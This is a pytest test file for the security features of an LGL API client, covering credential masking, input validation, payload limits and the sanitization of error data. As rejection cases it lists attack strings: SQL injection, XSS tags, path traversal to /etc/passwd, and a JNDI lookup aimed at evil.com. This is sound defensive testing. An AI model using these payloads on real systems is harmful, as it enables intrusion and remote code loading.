"""Tests for security features in the LGL client."""
import pytest
import re
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, Any

from lgl_client import new_client
from lgl_client.lgl_api.client import LGLClient
from lgl_client.lgl_api.exceptions import LGLAPIError, UnauthorizedError


class TestSecurityFeatures:
    """Test security features and protections."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return new_client(api_key="test_api_key_sensitive_12345")

    @pytest.fixture
    def debug_client(self):
        """Create debug client for testing debug mode security."""
        return LGLClient(api_key="test_api_key_sensitive_12345", debug=True)

    def test_credential_masking_in_debug_mode(self, debug_client, capsys):
        """Test that API keys are masked in debug output."""
        with patch.object(debug_client, '_client') as mock_httpx:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"items": [], "total": 0}
            mock_response.raise_for_status = Mock()
            mock_httpx.get.return_value = mock_response
            mock_httpx.headers = {"Authorization": "Bearer test_api_key_sensitive_12345"}

            # Make a request that triggers debug output
            debug_client._get("test/endpoint", test_param="value")

            # Capture debug output
            captured = capsys.readouterr()
            
            # Verify credential is masked
            assert "test_api_key_sensitive_12345" not in captured.out
            assert "Bearer t" in captured.out  # Start of masked token should be visible
            assert "2345" in captured.out      # Last 4 chars should be visible
            assert "..." in captured.out       # Mask indicator should be present

    def test_debug_header_masking(self, debug_client, capsys):
        """Test that sensitive headers are masked in debug output."""
        with patch.object(debug_client, '_client') as mock_httpx:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"items": [], "total": 0}
            mock_response.raise_for_status = Mock()
            mock_httpx.get.return_value = mock_response
            
            # Set up headers with sensitive information
            mock_httpx.headers = {
                "Authorization": "Bearer very_long_secret_key_123456789",
                "X-API-Key": "short",
                "Content-Type": "application/json"
            }

            debug_client._get("test/endpoint")
            captured = capsys.readouterr()

            # Long auth header should be masked with first 8/last 4 characters
            assert "Bearer v...6789" in captured.out
            # Short API key should be completely masked
            assert "***MASKED***" in captured.out
            # Non-sensitive headers should not be masked
            assert "application/json" in captured.out

    def test_parameter_validation_prevents_injection(self, client):
        """Test that parameter validation prevents injection attacks."""
        # Test parameter with spaces (should fail)
        with pytest.raises(ValueError, match="Invalid parameter name"):
            client.categories._client._validate_api_params({
                "param with spaces": "value",
                "normal_param": "value"
            })

        # Test parameter with SQL injection attempt (should fail due to special chars)
        with pytest.raises(ValueError, match="Invalid parameter name"):
            client.categories._client._validate_api_params({
                "'; DROP TABLE users; --": "sql_injection"
            })
        
        # Test parameter with script tag (should fail)
        with pytest.raises(ValueError, match="Invalid parameter name"):
            client.categories._client._validate_api_params({
                "<script>": "xss_attempt"
            })

    def test_parameter_value_validation(self, client):
        """Test parameter value validation and sanitization."""
        # Test oversized string parameter
        with pytest.raises(ValueError, match="String parameter too long"):
            client.categories._client._validate_api_params({
                "test_param": "A" * 1001  # Exceeds 1000 char limit
            })

        # Test oversized list parameter
        with pytest.raises(ValueError, match="List parameter too long"):
            client.categories._client._validate_api_params({
                "test_list": list(range(101))  # Exceeds 100 item limit
            })

    def test_suspicious_pattern_detection(self, client, caplog):
        """Test that suspicious patterns in parameters are logged."""
        # These should log warnings but not fail
        params = {
            "search": "<script>alert('xss')</script>",
            "filter": "javascript:malicious()",
            "query": "'; DROP TABLE users; --"
        }
        
        validated = client.categories._client._validate_api_params(params)
        
        # Should not raise exception but should log warnings
        assert len(caplog.records) >= 3
        assert any("Suspicious pattern detected" in record.message for record in caplog.records)
        
        # Parameters should still be included (logged for monitoring)
        assert "search" in validated
        assert "filter" in validated
        assert "query" in validated

    def test_json_payload_size_limits(self, client):
        """Test JSON payload size validation."""
        # Create oversized payload
        large_payload = {
            f"field_{i}": "A" * 100 for i in range(200)  # Should exceed 10KB limit
        }
        
        with pytest.raises(ValueError, match="Payload too large"):
            client.categories._client._validate_json_payload(large_payload)

    def test_nested_payload_depth_limits(self, client):
        """Test nested payload depth validation."""
        # Create deeply nested payload
        deep_payload = {"level1": {"level2": {"level3": {"level4": {"level5": {"level6": "too_deep"}}}}}}
        
        with pytest.raises(ValueError, match="Payload nesting too deep"):
            client.categories._client._validate_json_payload(deep_payload)

    def test_exception_payload_sanitization(self, client):
        """Test that exceptions sanitize sensitive data from payloads."""
        from lgl_client.lgl_api.exceptions import LGLAPIError
        
        # Create exception with sensitive payload
        sensitive_payload = {
            "email": "user@example.com",
            "password": "secret123",
            "ssn": "123-45-6789",
            "normal_field": "safe_value"
        }
        
        error = LGLAPIError(
            "Test error",
            status_code=400,
            url="https://api.example.com/test",
            payload=sensitive_payload
        )
        
        # Test that payload is properly sanitized in the stored payload
        sanitized_payload = error.payload
        
        # Sensitive fields should be masked in the stored payload
        assert "secret123" not in str(sanitized_payload["password"])
        assert "123-45-6789" not in str(sanitized_payload["ssn"])
        assert "user@example.com" not in str(sanitized_payload["email"])
        
        # Check the actual sanitized values
        assert sanitized_payload["password"] == "se***23"
        assert sanitized_payload["ssn"] == "12***89"
        assert sanitized_payload["email"] == "us***om"
        
        # Non-sensitive fields should be preserved
        assert sanitized_payload["normal_field"] == "safe_value"

    def test_url_sanitization_in_exceptions(self, client):
        """Test that URLs with sensitive data are sanitized in exceptions."""
        from lgl_client.lgl_api.exceptions import LGLAPIError
        
        # URL with sensitive query parameters
        sensitive_url = "https://api.example.com/users?api_key=secret123&email=user@example.com&phone=555-1234"
        
        error = LGLAPIError(
            "Test error",
            status_code=400,
            url=sensitive_url
        )
        
        error_str = str(error)
        
        # Sensitive query parameters should be masked
        assert "secret123" not in error_str
        assert "user@example.com" not in error_str
        assert "555-1234" not in error_str
        
        # URL structure should be preserved
        assert "https://api.example.com/users" in error_str

    def test_debug_data_sanitization(self, debug_client):
        """Test sanitization of debug data output."""
        test_data = {
            "email": "test@example.com",
            "password": "secret123",
            "birth_date": "1990-01-01",
            "safe_field": "safe_value",
            "nested": {
                "api_key": "nested_secret",
                "normal": "normal_value"
            }
        }
        
        sanitized = debug_client._sanitize_debug_data(test_data)
        
        # Sensitive fields should be masked
        assert "secret123" not in str(sanitized)
        assert "test@example.com" not in str(sanitized)
        assert "nested_secret" not in str(sanitized)
        assert "1990-01-01" not in str(sanitized)
        
        # Safe fields should be preserved
        assert sanitized["safe_field"] == "safe_value"
        assert sanitized["nested"]["normal"] == "normal_value"
        
        # Masked fields should have mask indicators
        assert "***" in str(sanitized["email"]) or "te***om" in str(sanitized["email"])

    def test_parameter_name_validation(self, client):
        """Test parameter name validation against malicious patterns."""
        malicious_params = [
            "../../../etc/passwd",  # Path traversal
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "${jndi:ldap://evil.com/a}",  # JNDI injection
            "param with spaces",  # Invalid characters
            "param@domain.com",  # Special characters
            "param$var",  # Special characters
        ]
        
        for param_name in malicious_params:
            with pytest.raises(ValueError, match="Invalid parameter name"):
                client.categories._client._validate_api_params({param_name: "value"})
        
        # Test that some borderline cases that pass the pattern are still handled
        borderline_safe = [
            "__proto__",  # Prototype pollution (passes regex but could be dangerous)
            "constructor",  # JavaScript constructor
            "prototype"  # JavaScript prototype
        ]
        
        for param_name in borderline_safe:
            # These should pass validation but be noted as potentially dangerous
            validated = client.categories._client._validate_api_params({param_name: "value"})
            assert param_name in validated

    def test_safe_parameter_names_allowed(self, client):
        """Test that legitimate parameter names are allowed."""
        safe_params = {
            "limit": 10,
            "offset": 0,
            "item_type": "Constituent",
            "search_query": "test",
            "category_id": 123,
            "start_date": "2025-01-01",
            "end_date": "2025-12-31"
        }
        
        # Should not raise any exceptions
        validated = client.categories._client._validate_api_params(safe_params)
        assert len(validated) == len(safe_params)

    def test_input_encoding_safety(self, client):
        """Test that various input encodings are handled safely."""
        # Test unicode and special characters
        unicode_params = {
            "name": "José María González",
            "description": "测试描述",
            "emoji": "🎉 Celebration",
            "symbols": "Special chars: !@#$%^&*()"
        }
        
        # Should handle unicode without issues
        validated = client.categories._client._validate_api_params(unicode_params)
        assert validated["name"] == "José María González"
        assert validated["description"] == "测试描述"

    def test_http_method_debug_consistency(self, debug_client, capsys):
        """Test that debug logging works consistently across HTTP methods."""
        with patch.object(debug_client, '_client') as mock_httpx:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"id": 1}
            mock_response.raise_for_status = Mock()
            mock_httpx.get.return_value = mock_response
            mock_httpx.post.return_value = mock_response
            mock_httpx.patch.return_value = mock_response
            mock_httpx.delete.return_value = mock_response
            mock_httpx.headers = {"Authorization": "Bearer test_key_12345"}

            # Test all HTTP methods have debug logging
            debug_client._get("test")
            debug_client._post("test", {"field": "value"})
            debug_client._patch("test", {"field": "updated"})
            debug_client._delete("test")

            captured = capsys.readouterr()
            
            # All methods should appear in debug output
            assert "GET" in captured.out
            assert "POST" in captured.out
            assert "PATCH" in captured.out
            assert "DELETE" in captured.out
            
            # API key should be masked in all outputs
            debug_lines = captured.out.split('\n')
            auth_lines = [line for line in debug_lines if 'Authorization' in line]
            for line in auth_lines:
                assert "test_key_12345" not in line
                assert "Bearer t...2345" in line  # First 8/last 4 char masking

    def test_environment_variable_safety(self, monkeypatch):
        """Test that environment variables don't leak sensitive data."""
        # Set sensitive environment variable
        monkeypatch.setenv("LGL_API_KEY", "env_secret_api_key_123")
        
        # Client should work with env var but not expose it
        import os
        client = new_client(os.getenv("LGL_API_KEY"))  # Should use env var
        
        # Debug output should still mask the key from env
        debug_client = LGLClient(os.getenv("LGL_API_KEY"), debug=True)
        
        with patch.object(debug_client, '_client') as mock_httpx:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {"items": []}
            mock_response.raise_for_status = Mock()
            mock_httpx.get.return_value = mock_response
            mock_httpx.headers = {"Authorization": "Bearer env_secret_api_key_123"}

            # Just testing that env vars are handled securely without leaking
            assert client is not None
            assert debug_client is not None

    def test_memory_safety_with_large_responses(self, client):
        """Test that large responses don't cause memory issues."""
        # Simulate processing a response with large individual items
        large_response_data = {
            "items": [
                {"id": i, "name": f"Item {i}", "item_type": "Constituent", "description": "A" * 1000}
                for i in range(10)  # 10 items with very large descriptions
            ],
            "total": 10
        }
        
        # Should handle large datasets without memory issues
        with patch.object(client.categories._client, '_get', return_value=large_response_data):
            # This should complete without memory errors
            items = client.categories.fetch_all()
            assert len(items) == 10
            # Check that large strings are preserved
            assert len(items[0].description) == 1000

    def test_error_message_security(self, client):
        """Test that error messages don't leak sensitive information."""
        with patch.object(client.categories._client._client, 'get') as mock_httpx_get:
            # Simulate error response with sensitive data
            mock_response = Mock()
            mock_response.status_code = 401
            mock_response.is_success = False  # Mark as failed response
            mock_response.json.return_value = {
                "error": "Invalid API key: test_secret_key_123",
                "debug_info": {
                    "user_id": 12345,
                    "api_key": "test_secret_key_123",
                    "internal_error": "Database connection failed for user admin@internal.com"
                }
            }
            mock_response.url = "https://api.littlegreenlight.com/api/v1/test"
            mock_httpx_get.return_value = mock_response

            with pytest.raises(UnauthorizedError):
                client.categories._client._get("test")

            # Exception should not contain raw sensitive data
            # This would be caught by the exception sanitization logic